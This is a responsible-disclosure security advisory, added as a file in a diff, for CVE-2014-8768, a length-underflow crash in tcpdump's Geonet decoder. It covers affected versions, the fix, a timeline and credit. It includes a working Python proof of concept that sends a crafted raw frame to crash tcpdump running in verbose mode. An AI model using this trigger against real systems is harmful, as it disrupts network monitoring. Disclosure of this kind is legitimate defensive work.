@@ -1,0 +1,79 @@
+CVE-2014-8768 tcpdump denial of service in verbose mode using malformed 
+Geonet payload
+
+1. Background
+
+tcpdump is a powerful command-line packet analyzer. It allows the user 
+to intercept and display TCP/IP and other packets being transmitted or 
+received over a network to which the computer is attached.
+
+2. Summary Information
+
+It was found out that malformed network traffic (Geonet-based) can lead 
+to an application crash (denial of service) if verbose output of tcpdump 
+monitoring the network is used.
+
+3. Technical Description
+
+The application decoder for the geonet protocol fails to perform 
+external input validation and performs insufficient checking on length 
+computations leading to an unsafe decrement and underflow in the function
+
+geonet_print(netdissect_options *ndo, const u_char *eth, const u_char 
+*bp, u_int length)
+
+The affected variable is length which is later on used to print a memory 
+chunk which eventually leads to a segfault. The function contains 
+several unsafe computations updating the length variable.
+
+To reproduce start tcpdump on a network interface
+
+sudo tcpdump -i lo -s 0 -n -v
+
+(running the program with sudo might hide the segfault message on 
+certain environments, see dmesg for details)
+
+and use the following python program to generate a frame on the network 
+(might also need sudo):
+
+#!/usr/bin/env python
+from socket import socket, AF_PACKET, SOCK_RAW
+s = socket(AF_PACKET, SOCK_RAW)
+s.bind(("lo", 0))
+
+geonet_frame = 
+"\x00\x1f\xc6\x51\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\xc6\x51\x07\x07\x07\x07\x07\x07\xef\x06\x07\x35\x97\x00\x24\x8c\x7a\xdf\x6f\x08\x00\x45\x00\x00\x3d\xf3\x7f\x40\x00\x40\x11\x30\xc6\x0a\x01\x01\x68\x0a\x01\x01\x01\x99\x80\x00\x35\x00\x29\x16\xa5\x01\x76\x01\x00\x00\xff\x00\x00\x01\x00\x00\x00"
+
+s.send(geonet_frame)
+
+4. Affected versions
+
+Affected versions are 4.5.0 through 4.6.2
+
+(segfaults were reproducible in versions up to 4.6.1 on Ubuntu 14.04, 
+but not reliably in 4.6.2. Code audit showed that unsafe computations 
+are performed in 4.6.2, but the trigger frame might need to look different).
+
+5. Fix
+
+The problem is fixed in the upcoming version tcpdump 4.7.0
+
+6. Advisory Timeline
+
+2014-11-08 Discovered
+2014-11-09 Requested CVE
+2014-11-11 Reported vendor by email
+2014-11-12 Vendor made a fix available as repository patch
+2014-11-13 CVE number received
+2014-11-13 Published CVE advisory
+
+7. Credit
+
+The issue was found by
+
+Steffen Bauch
+Twitter: @steffenbauch
+http://steffenbauch.de
+
+using a slightly enhanced version of american fuzzy lop 
+(https://code.google.com/p/american-fuzzy-lop/) created by Michal Zalewski.
